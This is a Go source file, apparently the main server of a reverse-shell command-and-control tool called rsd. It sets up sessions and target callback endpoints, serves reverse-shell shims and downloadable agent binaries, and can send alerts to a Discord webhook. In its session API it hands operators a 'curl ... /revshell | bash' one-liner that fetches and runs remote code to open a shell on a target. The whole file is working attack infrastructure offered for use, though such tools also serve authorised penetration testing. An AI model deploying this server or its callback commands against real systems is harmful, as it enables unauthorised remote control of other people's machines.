package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	chlog "github.com/charmbracelet/log"
	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
	"github.com/noahmagill/webhook-rev-shell/internal/agents"
	"github.com/noahmagill/webhook-rev-shell/internal/auth"
	"github.com/noahmagill/webhook-rev-shell/internal/broker"
	"github.com/noahmagill/webhook-rev-shell/internal/config"
	"github.com/noahmagill/webhook-rev-shell/internal/notify"
	"github.com/noahmagill/webhook-rev-shell/internal/protocol"
	"github.com/noahmagill/webhook-rev-shell/internal/payload"
	rsdmw "github.com/noahmagill/webhook-rev-shell/internal/middleware"
	"github.com/noahmagill/webhook-rev-shell/internal/store"
	"github.com/noahmagill/webhook-rev-shell/internal/transport"
	"github.com/noahmagill/webhook-rev-shell/web"
)

func main() {
	listen := flag.String("listen", ":8080", "listen address")
	dbPath := flag.String("db", "rsd.db", "bbolt database path")
	publicURL := flag.String("public-url", "http://localhost:8080", "public URL for payload generation")
	agentsDir := flag.String("agents-dir", "agents-bin", "directory with rs-agent binaries per platform")
	agentsGit := flag.Bool("agents-git", false, "on startup, download rs-agent release binaries from GitHub into --agents-dir")
	agentsGitRepo := flag.String("agents-git-repo", "https://github.com/nmagill123/revshells-io", "GitHub repo for --agents-git")
	agentsGitTag := flag.String("agents-git-tag", "", "release tag for --agents-git (e.g. v0.1.0); empty uses latest")
	discordWebhookURL := flag.String("discord-webhook-url", "", "optional Discord webhook URL for session creation and callback notifications")
	analyticsFile := flag.String("analytics-file", "", "optional HTML snippet file injected into pages (default: web/static/analytics.local.html or /data/analytics.local.html)")
	maxSessions := flag.Int("max-sessions-per-workspace", 12, "max active sessions per workspace")
	verbose := flag.Bool("verbose", false, "enable verbose debug logging")
	flag.Parse()

	level := chlog.InfoLevel
	if *verbose {
		level = chlog.DebugLevel
	}
	logger := chlog.NewWithOptions(os.Stderr, chlog.Options{
		Level:           level,
		ReportTimestamp: true,
		TimeFormat:      time.RFC3339,
	})
	chlog.SetDefault(logger)

	if path := web.InitAnalytics(*analyticsFile); path != "" {
		chlog.Info("analytics snippet enabled", "path", path)
	}

	authCfg := config.DefaultAuth(*publicURL)
	authCfg.MaxSessionsPerWorkspace = *maxSessions
	originPatterns := authCfg.AllowedOrigins

	s, err := store.Open(*dbPath)
	if err != nil {
		chlog.Fatal("open db failed", "path", *dbPath, "err", err)
	}
	defer s.Close()

	b := broker.New(s)

	discordN := notify.NewDiscord(*discordWebhookURL, *publicURL)

	pollH := &transport.PollHandler{B: b, Discord: discordN}
	wsOpH := &transport.WSOperatorHandler{B: b, OriginPatterns: originPatterns}
	wsTargH := &transport.WSTargetHandler{B: b, Discord: discordN, OriginPatterns: originPatterns}
	payloadH := &payload.PayloadHandler{PublicURL: strings.TrimRight(*publicURL, "/")}
	agentStore := &agents.Store{Dir: *agentsDir}

	if *agentsGit {
		gitCfg := agents.GitSyncConfig{
			Repo: *agentsGitRepo,
			Tag:  *agentsGitTag,
			Dir:  *agentsDir,
		}
		chlog.Info("syncing agents from GitHub", "source", agents.ReleaseDownloadBase(gitCfg), "dir", *agentsDir)
		if err := agents.SyncFromGitHub(gitCfg); err != nil {
			chlog.Fatal("agents-git sync failed", "err", err)
		}
		chlog.Info("agents-git sync complete", "dir", *agentsDir)
	}

	originMW := rsdmw.RequireSameOrigin(originPatterns)
	rateStrict := rsdmw.RateLimit(0.5, 5)
	rateLoose := rsdmw.RateLimit(2, 20)

	r := chi.NewRouter()
	r.Use(middleware.Recoverer)
	r.Use(middleware.RealIP)

	base := strings.TrimRight(*publicURL, "/")

	// Workspace-scoped operator API (rsctl)
	r.Route("/api/workspace", func(r chi.Router) {
		r.Use(auth.MiddlewareWorkspaceBearer(s))
		r.Post("/sessions", func(w http.ResponseWriter, req *http.Request) {
			p, _ := auth.PrincipalFromContext(req.Context())
			var body struct {
				Name string `json:"name"`
			}
			_ = json.NewDecoder(req.Body).Decode(&body)
			if body.Name == "" {
				body.Name = "unnamed"
			}
			sess, browserToken, err := b.CreateSession(body.Name, p.WorkspaceID, authCfg)
			if errors.Is(err, broker.ErrSessionCapReached) {
				http.Error(w, err.Error(), http.StatusForbidden)
				return
			}
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{
				"id":          sess.ID,
				"name":        sess.Name,
				"browser_url": fmt.Sprintf("%s/%s?t=%s", base, sess.ID, browserToken),
				"callback":    fmt.Sprintf("curl -fsSL %s/%s/revshell | bash", base, sess.ID),
			})
		})
		r.Get("/sessions", func(w http.ResponseWriter, req *http.Request) {
			p, _ := auth.PrincipalFromContext(req.Context())
			sessions, err := b.ListSessionsForWorkspace(p.WorkspaceID)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			pub := make([]protocol.SessionPublic, 0, len(sessions))
			for _, sess := range sessions {
				pub = append(pub, protocol.SessionToPublic(sess))
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(pub)
		})
		r.Get("/sessions/{id}", func(w http.ResponseWriter, req *http.Request) {
			p, _ := auth.PrincipalFromContext(req.Context())
			id := chi.URLParam(req, "id")
			if err := auth.RequireSessionAccess(s, p, id); err != nil {
				http.Error(w, "forbidden", http.StatusForbidden)
				return
			}
			sess, err := s.GetSession(id)
			if err != nil {
				http.Error(w, "not found", 404)
				return
			}
			targets, _ := s.ListTargets(id)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{
				"session": protocol.SessionToPublic(sess),
				"targets": targets,
			})
		})
		r.Delete("/sessions/{id}", func(w http.ResponseWriter, req *http.Request) {
			p, _ := auth.PrincipalFromContext(req.Context())
			id := chi.URLParam(req, "id")
			if err := auth.RequireSessionAccess(s, p, id); err != nil {
				http.Error(w, "forbidden", http.StatusForbidden)
				return
			}
			if err := b.KillSession(id); err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			w.WriteHeader(http.StatusNoContent)
		})
	})

	// Target callback endpoints (secret in URL)
	r.Route("/s/{id}/{secret}", func(r chi.Router) {
		r.With(rateLoose).Post("/register", pollH.Register)
		r.Get("/poll", pollH.Poll)
		r.Post("/push", pollH.Push)
		r.Post("/event", pollH.Event)
		r.Get("/connect", wsTargH.Connect)
		r.Get("/sh", payloadH.ShellShim)
		r.Get("/py", payloadH.PythonShim)
		r.Get("/info", payloadH.Info)
	})

	attachHandler := func(w http.ResponseWriter, req *http.Request) {
		sessionID := chi.URLParam(req, "id")
		if _, err := s.GetSession(sessionID); err != nil {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		if _, err := auth.ResolveAttachPrincipal(s, req, sessionID); err != nil {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		wsOpH.Attach(w, req)
	}

	sessionPageHandler := func(w http.ResponseWriter, req *http.Request) {
		sessionID := chi.URLParam(req, "id")
		if t := req.URL.Query().Get("t"); t != "" {
			bt, err := s.GetBrowserToken(t)
			if err == nil && time.Now().Before(bt.ExpiresAt) && bt.SessionID == sessionID {
				auth.SetSessionCookie(w, t, int(time.Until(bt.ExpiresAt).Seconds()))
			}
		}
		if _, err := s.GetSession(sessionID); err != nil {
			http.Error(w, "session not found", http.StatusNotFound)
			return
		}
		b.Touch(sessionID)
		web.ServePage(w, "session.html")
	}

	// Browser / hub API
	r.Group(func(r chi.Router) {
		r.Use(originMW)

		r.With(rateStrict).Post("/web/workspace", func(w http.ResponseWriter, req *http.Request) {
			if _, err := req.Cookie(auth.CookieWorkspace); err == nil {
				if wsID, err := auth.WorkspaceIDFromRequest(s, req); err == nil {
					w.Header().Set("Content-Type", "application/json")
					json.NewEncoder(w).Encode(map[string]string{"workspace_id": wsID})
					return
				}
			}
			wsID, tok, exp, err := auth.BootstrapWorkspace(s, authCfg)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			auth.SetWorkspaceCookie(w, tok, int(time.Until(exp).Seconds()))
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{
				"workspace_id": wsID,
				"expires_at":   exp,
			})
		})

		r.With(rateStrict).Post("/web/workspace-cli-token", func(w http.ResponseWriter, req *http.Request) {
			wsID, err := auth.WorkspaceIDFromRequest(s, req)
			if err != nil {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			tok, exp, err := auth.IssueWorkspaceCLIToken(s, wsID, authCfg)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{
				"token":      tok,
				"expires_at": exp,
				"server":     payload.BaseURL(req, payloadH.PublicURL),
			})
		})

		r.With(rateLoose).Post("/web/sessions", func(w http.ResponseWriter, req *http.Request) {
			wsID, err := auth.WorkspaceIDFromRequest(s, req)
			if err != nil {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			sess, browserToken, err := b.CreateSession("web", wsID, authCfg)
			if errors.Is(err, broker.ErrSessionCapReached) {
				http.Error(w, err.Error(), http.StatusForbidden)
				return
			}
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{
				"id":    sess.ID,
				"name":  sess.Name,
				"token": browserToken,
			})
			if discordN.Enabled() {
				operatorIP := requestIP(req.RemoteAddr)
				go func() {
					if err := discordN.SessionCreated(sess, browserToken, operatorIP); err != nil {
						chlog.Error("discord session create notify failed", "session_id", sess.ID, "operator_ip", operatorIP, "err", err)
					}
				}()
			}
		})

		r.Get("/web/sessions/{id}", func(w http.ResponseWriter, req *http.Request) {
			id := chi.URLParam(req, "id")
			sess, err := s.GetSession(id)
			if err != nil {
				http.Error(w, "not found", 404)
				return
			}
			if err := auth.ValidateBrowserTokenForSession(s, req, id); err != nil {
				if wsID, werr := auth.WorkspaceIDFromRequest(s, req); werr == nil {
					ok, _ := s.SessionOwnedBy(wsID, id)
					if !ok {
						http.Error(w, "forbidden", http.StatusForbidden)
						return
					}
				} else {
					http.Error(w, "forbidden", http.StatusForbidden)
					return
				}
			}
			targets, _ := s.ListTargets(id)
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{
				"id":          sess.ID,
				"state":       sess.State,
				"last_target": sess.LastTarget,
				"targets":     targets,
			})
		})

		r.With(rateStrict).Post("/web/operator-token", func(w http.ResponseWriter, req *http.Request) {
			var body struct {
				SessionID string `json:"session_id"`
			}
			_ = json.NewDecoder(req.Body).Decode(&body)
			sessionID := body.SessionID
			if sessionID == "" {
				sessionID = chi.URLParam(req, "id")
			}
			if sessionID == "" {
				http.Error(w, "session_id required", http.StatusBadRequest)
				return
			}
			if err := auth.ValidateBrowserTokenForSession(s, req, sessionID); err != nil {
				http.Error(w, "unauthorized", http.StatusUnauthorized)
				return
			}
			sess, err := s.GetSession(sessionID)
			if err != nil {
				http.Error(w, "not found", 404)
				return
			}
			tok, exp, err := auth.IssueSessionCLIToken(s, sess.OwnerWorkspaceID, sessionID, authCfg)
			if err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{
				"token":      tok,
				"expires_at": exp,
				"server":     payload.BaseURL(req, payloadH.PublicURL),
				"session_id": sessionID,
			})
		})
	})

	r.Get("/web/version", func(w http.ResponseWriter, req *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"version": web.Version()})
	})
	r.Get("/static/*", func(w http.ResponseWriter, req *http.Request) {
		name := strings.TrimPrefix(req.URL.Path, "/static/")
		web.ServeStatic(w, req, name)
	})
	r.Get("/", func(w http.ResponseWriter, req *http.Request) {
		web.ServePage(w, "hub.html")
	})

	r.Group(func(r chi.Router) {
		r.With(rateLoose).Get("/{id}/attach", attachHandler)
		r.With(rateLoose).Get("/s/{id}/attach", attachHandler)

		r.With(rateLoose).Get("/{id}/revshell", func(w http.ResponseWriter, req *http.Request) {
			sessionID := chi.URLParam(req, "id")
			sess, err := s.GetSession(sessionID)
			if err != nil || sess.State == protocol.StateExpired || sess.State == protocol.StateKilled {
				http.Error(w, "session not found", http.StatusNotFound)
				return
			}
			_, _ = b.GetOrLoadRoom(sessionID)
			b.Touch(sessionID)
			payloadH.RevShell(w, req, sess.ID, sess.Secret)
		})

		r.With(rateLoose).Get("/{id}/nopty", func(w http.ResponseWriter, req *http.Request) {
			sessionID := chi.URLParam(req, "id")
			sess, err := s.GetSession(sessionID)
			if err != nil || sess.State == protocol.StateExpired || sess.State == protocol.StateKilled {
				http.Error(w, "session not found", http.StatusNotFound)
				return
			}
			_, _ = b.GetOrLoadRoom(sessionID)
			b.Touch(sessionID)
			payloadH.RevShellNoPTY(w, req, sess.ID, sess.Secret)
		})

		r.With(rateLoose).Get("/{id}/agent/{platform}", func(w http.ResponseWriter, req *http.Request) {
			sessionID := chi.URLParam(req, "id")
			platform := chi.URLParam(req, "platform")
			sess, err := s.GetSession(sessionID)
			if err != nil || sess.State == protocol.StateExpired || sess.State == protocol.StateKilled {
				http.Error(w, "session not found", http.StatusNotFound)
				return
			}
			_ = sess
			data, err := agentStore.Get(platform)
			if err != nil {
				http.Error(w, err.Error(), http.StatusNotFound)
				return
			}
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Header().Set("Content-Disposition", "attachment; filename=rs-agent")
			w.Write(data)
		})

		r.Get("/{id}", sessionPageHandler)
		r.Get("/s/{id}", sessionPageHandler)
	})

	srv := &http.Server{Addr: *listen, Handler: r}

	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	go func() {
		staleTicker := time.NewTicker(5 * time.Second)
		sweepTicker := time.NewTicker(60 * time.Second)
		defer staleTicker.Stop()
		defer sweepTicker.Stop()
		for {
			select {
			case <-staleTicker.C:
				b.PruneStaleTargets()
			case <-sweepTicker.C:
				b.Sweep(6 * time.Hour)
			case <-ctx.Done():
				return
			}
		}
	}()

	go func() {
		<-ctx.Done()
		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		srv.Shutdown(shutCtx)
	}()

	chlog.Info("rsd listening",
		"version", web.Version(),
		"listen", *listen,
		"public_url", *publicURL,
		"max_sessions_per_workspace", authCfg.MaxSessionsPerWorkspace,
		"agents_dir", *agentsDir,
	)
	if discordN.Enabled() {
		chlog.Info("discord webhook enabled")
	}

	if err := srv.ListenAndServe(); err != http.ErrServerClosed {
		chlog.Fatal("server exited", "err", err)
	}
}

func requestIP(remoteAddr string) string {
	host, _, err := net.SplitHostPort(remoteAddr)
	if err == nil {
		return host
	}
	return remoteAddr
}
